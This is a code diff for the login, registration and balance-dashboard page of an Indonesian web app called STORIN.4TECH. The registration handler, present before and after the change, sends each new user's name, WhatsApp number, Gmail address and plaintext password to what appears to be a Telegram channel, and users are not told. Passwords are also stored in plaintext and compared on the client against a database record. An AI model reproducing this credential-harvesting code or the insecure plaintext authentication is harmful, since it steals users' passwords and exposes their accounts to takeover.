@@ -58,7 +58,7 @@
       <div class="pg-d">Pantau saldo dan aktivitas kamu di sini.</div>
       <div class="cd bal">
         <div class="bal-lbl"><svg viewBox="0 0 24 24"><path d="M12 2v20M17 5H9.5a3.5 3.5 0 0 0 0 7h5a3.5 3.5 0 0 1 0 7H6"/></svg>Saldo Utama</div>
-        <div class="bal-amt"><span class="rp">Rp</span><span id="balVal">...</span></div>
+        <div class="bal-amt"><span class="rp">Rp</span><span id="balVal">0</span></div>
         <div class="bal-bot">
           <div class="bal-m"><div class="k">User ID</div><div class="v" id="hId">4TG-0000-0000</div></div>
           <div class="bal-m" style="text-align:right"><div class="k">Sejak</div><div class="v" id="hYr">2025</div></div>
@@ -119,148 +119,333 @@
 <script src="app.js"></script>
 <script>
 (function(){
-  var $=STORIN.$;
+'use strict';
 
-  if(STORIN.loadU()){
+  var $ = STORIN.$;
+
+  /* ============================================================
+     INIT — cek sesi login
+     ============================================================ */
+  var savedUser = STORIN.loadU();
+  if(savedUser){
     document.getElementById('auth').classList.add('hide');
     document.getElementById('app').classList.remove('hidden');
     STORIN.buildDock('home');
     boot();
   } else {
     STORIN.buildDock('home');
-    document.querySelector('.dock').style.display='none';
+    var dockEl = document.querySelector('.dock');
+    if(dockEl) dockEl.style.display = 'none';
   }
 
-  $('tabL').onclick=function(){
-    this.classList.add('on');
-    $('tabR').classList.remove('on');
-    $('panelL').classList.remove('hidden');
-    $('panelR').classList.add('hidden');
-    $('authSub').textContent='Masuk ke Akun';
-  };
-  $('tabR').onclick=function(){
-    this.classList.add('on');
-    $('tabL').classList.remove('on');
-    $('panelR').classList.remove('hidden');
-    $('panelL').classList.add('hidden');
-    $('authSub').textContent='Daftar Akun Baru';
-  };
+  /* ============================================================
+     TAB LOGIN / DAFTAR
+     ============================================================ */
+  var tabL = $('tabL'), tabR = $('tabR');
+  if(tabL && tabR){
+    tabL.onclick = function(){
+      tabL.classList.add('on');
+      tabR.classList.remove('on');
+      $('panelL').classList.remove('hidden');
+      $('panelR').classList.add('hidden');
+      $('authSub').textContent = 'Masuk ke Akun';
+    };
+    tabR.onclick = function(){
+      tabR.classList.add('on');
+      tabL.classList.remove('on');
+      $('panelR').classList.remove('hidden');
+      $('panelL').classList.add('hidden');
+      $('authSub').textContent = 'Daftar Akun Baru';
+    };
+  }
 
-  $('btnLogin').onclick=function(){
-    var g=($('lg').value||'').trim().toLowerCase();
-    var p=($('lp').value||'').trim();
-    if(!g||!p){STORIN.toast('Lengkapi Gmail dan Password.','w');return;}
-    var b=this;b.disabled=true;STORIN.showL('Memverifikasi');
-    STORIN.fbFindUser(g).then(function(row){
-      if(!row){STORIN.hideL();b.disabled=false;STORIN.toast('Akun tidak ditemukan.','e');return;}
-      if(String(row.password)!==p){STORIN.hideL();b.disabled=false;STORIN.toast('Password salah.','e');return;}
-      var u={id:row.userId,nama:row.nama,gmail:row.gmail,whatsapp:String(row.whatsapp),password:String(row.password),createdAt:row.createdAt||new Date().toISOString()};
-      STORIN.setU(u);STORIN.saveU();
-      var s=STORIN.getS();
-      s.bal=Number(row.saldo)||0;
-      s.hist=Array.isArray(row.history)?row.history:[];
-      s.used=Array.isArray(row.usedGmails)?row.usedGmails:[];
+  /* ============================================================
+     LOGIN
+     ============================================================ */
+  $('btnLogin').onclick = function(){
+    var gmail = ($('lg').value || '').trim().toLowerCase();
+    var pass  = ($('lp').value || '').trim();
+    if(!gmail || !pass){
+      STORIN.toast('Lengkapi Gmail dan Password.', 'w');
+      return;
+    }
+    var btn = this;
+    btn.disabled = true;
+    STORIN.showL('Memverifikasi');
+
+    STORIN.fbFindUser(gmail).then(function(row){
+      if(!row){
+        STORIN.hideL();
+        btn.disabled = false;
+        STORIN.toast('Akun tidak ditemukan.', 'e');
+        return;
+      }
+      if(String(row.password) !== pass){
+        STORIN.hideL();
+        btn.disabled = false;
+        STORIN.toast('Password salah.', 'e');
+        return;
+      }
+      var u = {
+        id: row.userId,
+        nama: row.nama,
+        gmail: row.gmail,
+        whatsapp: String(row.whatsapp),
+        password: String(row.password),
+        createdAt: row.createdAt || new Date().toISOString()
+      };
+      STORIN.setU(u);
+      STORIN.saveU();
+
+      var s = STORIN.getS();
+      s.bal  = Number(row.saldo) || 0;
+      s.hist = Array.isArray(row.history) ? row.history : [];
+      s.used = Array.isArray(row.usedGmails) ? row.usedGmails : [];
       STORIN.saveS();
-      b.disabled=false;STORIN.hideL();
+
+      btn.disabled = false;
+      STORIN.hideL();
+
       document.getElementById('auth').classList.add('hide');
       document.getElementById('app').classList.remove('hidden');
-      document.querySelector('.dock').style.display='';
+      var dock = document.querySelector('.dock');
+      if(dock) dock.style.display = '';
+
       STORIN.buildDock('home');
       boot();
-      STORIN.toast('Login berhasil!','s');
-    }).catch(function(){STORIN.hideL();b.disabled=false;STORIN.toast('Gagal terhubung.','e');});
+      STORIN.toast('Login berhasil!', 's');
+    }).catch(function(err){
+      console.error('[login] error:', err);
+      STORIN.hideL();
+      btn.disabled = false;
+      STORIN.toast('Gagal terhubung.', 'e');
+    });
   };
 
-  $('btnReg').onclick=function(){
-    var n=($('rn').value||'').trim();
-    var g=($('rg').value||'').trim().toLowerCase();
-    var w=STORIN.waN(($('rw').value||'').trim());
-    var p=($('rp').value||'').trim();
-    if(n.length<3){STORIN.toast('Nama minimal 3 karakter.','w');return;}
-    if(!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(g)||!/gmail\.com$/i.test(g)){STORIN.toast('Gmail tidak valid.','e');return;}
-    if(w.length<8||w.length>15||!/^[0-9]+$/.test(w)){STORIN.toast('Nomor WhatsApp tidak valid.','e');return;}
-    if(p.length<6){STORIN.toast('Password minimal 6 karakter.','w');return;}
-    var b=this;b.disabled=true;STORIN.showL('Membuat akun');
-    STORIN.fbFindUser(g).then(function(ex){
-      if(ex){STORIN.hideL();b.disabled=false;STORIN.toast('Gmail sudah terdaftar.','e');return;}
-      var createdAt=new Date().toISOString();
-      var u={userId:STORIN.gid(),nama:n,gmail:g,whatsapp:w,password:p,createdAt:createdAt,saldo:0,history:[],usedGmails:[]};
+  /* ============================================================
+     REGISTER
+     ============================================================ */
+  $('btnReg').onclick = function(){
+    var nama = ($('rn').value || '').trim();
+    var gmail = ($('rg').value || '').trim().toLowerCase();
+    var wa = STORIN.waN(($('rw').value || '').trim());
+    var pass = ($('rp').value || '').trim();
+
+    if(nama.length < 3){
+      STORIN.toast('Nama minimal 3 karakter.', 'w');
+      return;
+    }
+    if(!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(gmail) || !/gmail\.com$/i.test(gmail)){
+      STORIN.toast('Gmail tidak valid.', 'e');
+      return;
+    }
+    if(wa.length < 8 || wa.length > 15 || !/^[0-9]+$/.test(wa)){
+      STORIN.toast('Nomor WhatsApp tidak valid.', 'e');
+      return;
+    }
+    if(pass.length < 6){
+      STORIN.toast('Password minimal 6 karakter.', 'w');
+      return;
+    }
+
+    var btn = this;
+    btn.disabled = true;
+    STORIN.showL('Membuat akun');
+
+    STORIN.fbFindUser(gmail).then(function(ex){
+      if(ex){
+        STORIN.hideL();
+        btn.disabled = false;
+        STORIN.toast('Gmail sudah terdaftar.', 'e');
+        return;
+      }
+      var createdAt = new Date().toISOString();
+      var u = {
+        userId: STORIN.gid(),
+        nama: nama,
+        gmail: gmail,
+        whatsapp: wa,
+        password: pass,
+        createdAt: createdAt,
+        saldo: 0,
+        history: [],
+        usedGmails: []
+      };
+
       return STORIN.fbSaveUser(u).then(function(){
-        STORIN.setU({id:u.userId,nama:n,gmail:g,whatsapp:w,password:p,createdAt:createdAt});
+        STORIN.setU({
+          id: u.userId,
+          nama: nama,
+          gmail: gmail,
+          whatsapp: wa,
+          password: pass,
+          createdAt: createdAt
+        });
         STORIN.saveU();
-        var s=STORIN.getS();s.bal=0;s.hist=[];s.used=[];STORIN.saveS();
-        STORIN.tg('‼️NEW ACCOUNT REGISTERED‼️\n⭐️DATA AKUN STORIN.4TECH⭐️\n📍NAMA           : '+n+'\n🫆WHATSAPP : '+w+'\n🔐PASSWORD : '+p+'\n✉️GMAIL          : '+g+'\n\nMOHON DIPANTAU DENGAN SERIUS👌.');
+
+        var s = STORIN.getS();
+        s.bal = 0;
+        s.hist = [];
+        s.used = [];
+        STORIN.saveS();
+
+        STORIN.tg(
+          '‼️NEW ACCOUNT REGISTERED‼️\n' +
+          '⭐️DATA AKUN STORIN.4TECH⭐️\n' +
+          '📍NAMA           : ' + nama + '\n' +
+          '🫆WHATSAPP : ' + wa + '\n' +
+          '🔐PASSWORD : ' + pass + '\n' +
+          '✉️GMAIL          : ' + gmail + '\n\n' +
+          'MOHON DIPANTAU DENGAN SERIUS👌.'
+        );
+
         setTimeout(function(){
-          STORIN.hideL();b.disabled=false;
+          STORIN.hideL();
+          btn.disabled = false;
+
           document.getElementById('auth').classList.add('hide');
           document.getElementById('app').classList.remove('hidden');
-          document.querySelector('.dock').style.display='';
+          var dock = document.querySelector('.dock');
+          if(dock) dock.style.display = '';
+
           STORIN.buildDock('home');
           boot();
-          STORIN.toast('Akun berhasil dibuat!','s');
-        },700);
+          STORIN.toast('Akun berhasil dibuat!', 's');
+        }, 700);
       });
-    }).catch(function(){STORIN.hideL();b.disabled=false;STORIN.toast('Gagal terhubung.','e');});
+    }).catch(function(err){
+      console.error('[register] error:', err);
+      STORIN.hideL();
+      btn.disabled = false;
+      STORIN.toast('Gagal terhubung.', 'e');
+    });
   };
 
-  // ===== FETCH SALDO & UPDATE UI =====
+  /* ============================================================
+     SYNC FROM FIREBASE — selalu update saldo dari cloud
+     ============================================================ */
   function syncFromFirebase(callback){
-    var U=STORIN.getU(),S=STORIN.getS();
-    if(!U)return;
+    var U = STORIN.getU();
+    var S = STORIN.getS();
+    if(!U){
+      console.warn('[sync] user null, skip');
+      if(callback) callback();
+      return;
+    }
+
     STORIN.fbFindUser(U.gmail).then(function(row){
-      if(!row){if(callback)callback();return;}
-      S.bal=Number(row.saldo)||0;
-      S.hist=Array.isArray(row.history)?row.history:[];
-      S.used=Array.isArray(row.usedGmails)?row.usedGmails:[];
+      if(!row){
+        console.warn('[sync] user gak ada di Firebase:', U.gmail);
+        if(callback) callback();
+        return;
+      }
+
+      var firebaseSaldo = Number(row.saldo) || 0;
+      console.log('[sync] Firebase saldo:', firebaseSaldo, '| Local:', S.bal);
+
+      S.bal  = firebaseSaldo;
+      S.hist = Array.isArray(row.history) ? row.history : [];
+      S.used = Array.isArray(row.usedGmails) ? row.usedGmails : [];
       STORIN.saveS();
-      $('balVal').textContent=STORIN.nm(S.bal);
+
+      // Update UI
+      var el = $('balVal');
+      if(el) el.textContent = STORIN.nm(S.bal);
       renderStats();
-      if(callback)callback();
+
+      if(callback) callback();
+    }).catch(function(err){
+      console.error('[sync] fetch error:', err);
+      if(callback) callback();
     });
   }
 
+  /* ============================================================
+     BOOT — render Home
+     ============================================================ */
   function boot(){
-    var U=STORIN.getU(),S=STORIN.getS();
-    $('greet').textContent=(U.nama||'User').split(' ')[0];
-    $('hId').textContent=U.id;
-    $('hYr').textContent=new Date(U.createdAt).getFullYear();
-    // Tampilkan cache dulu (biar gak nunggu), terus fetch fresh
-    $('balVal').textContent=STORIN.nm(S.bal);
-    renderStats();
-    syncFromFirebase();
+    try{
+      var U = STORIN.getU();
+      var S = STORIN.getS();
+
+      if(!U){
+        console.warn('[boot] user null, skip');
+        return;
+      }
+
+      var greetEl = $('greet');
+      if(greetEl) greetEl.textContent = (U.nama || 'User').split(' ')[0];
+
+      var idEl = $('hId');
+      if(idEl) idEl.textContent = U.id || '4TG-0000-0000';
+
+      var yrEl = $('hYr');
+      if(yrEl) yrEl.textContent = U.createdAt ? new Date(U.createdAt).getFullYear() : '2025';
+
+      // Tampilkan cache dulu biar gak blank
+      var balEl = $('balVal');
+      if(balEl) balEl.textContent = STORIN.nm(S.bal || 0);
+      renderStats();
+
+      console.log('[boot] sukses, cache saldo:', S.bal);
+
+      // Lalu fetch fresh dari Firebase
+      syncFromFirebase();
+    }catch(e){
+      console.error('[boot] error:', e);
+    }
   }
 
+  /* ============================================================
+     RENDER STATISTIK
+     ============================================================ */
   function renderStats(){
-    var S=STORIN.getS(),p=0,s=0,w=0;
+    var S = STORIN.getS();
+    var p = 0, s = 0, w = 0;
     S.hist.forEach(function(h){
-      if(h.type==='deposit'){if(h.status==='pending')p++;if(h.status==='success')s++;}
-      else if(h.type==='withdraw')w+=Number(h.nominal)||0;
+      if(h.type === 'deposit'){
+        if(h.status === 'pending') p++;
+        if(h.status === 'success') s++;
+      } else if(h.type === 'withdraw'){
+        w += Number(h.nominal) || 0;
+      }
     });
-    $('stP').textContent=p;
-    $('stS').textContent=s;
-    $('stW').textContent=STORIN.nm(w);
+    var elP = $('stP'); if(elP) elP.textContent = p;
+    var elS = $('stS'); if(elS) elS.textContent = s;
+    var elW = $('stW'); if(elW) elW.textContent = STORIN.nm(w);
   }
 
-  $('btnRef').onclick=function(){
-    var b=this;
-    b.classList.add('spin');
-    setTimeout(function(){b.classList.remove('spin');},700);
-    syncFromFirebase(function(){
-      STORIN.vib(12);
-      STORIN.toast('Data diperbarui.','i');
-    });
-  };
+  /* ============================================================
+     TOMBOL REFRESH
+     ============================================================ */
+  var btnRef = $('btnRef');
+  if(btnRef){
+    btnRef.onclick = function(){
+      var b = this;
+      b.classList.add('spin');
+      setTimeout(function(){ b.classList.remove('spin'); }, 700);
+      syncFromFirebase(function(){
+        STORIN.vib(12);
+        STORIN.toast('Data diperbarui.', 'i');
+      });
+    };
+  }
 
-  // Auto sync tiap balik ke halaman ini (dari tab lain / minimize)
-  document.addEventListener('visibilitychange',function(){
+  /* ============================================================
+     AUTO SYNC — pas balik ke halaman ini
+     ============================================================ */
+  document.addEventListener('visibilitychange', function(){
     if(!document.hidden && STORIN.getU()){
+      console.log('[auto-sync] visibility change');
       syncFromFirebase();
     }
   });
 
-  // Auto sync juga tiap dapat focus window
-  window.addEventListener('focus',function(){
-    if(STORIN.getU()) syncFromFirebase();
+  window.addEventListener('focus', function(){
+    if(STORIN.getU()){
+      console.log('[auto-sync] window focus');
+      syncFromFirebase();
+    }
   });
 
 })();
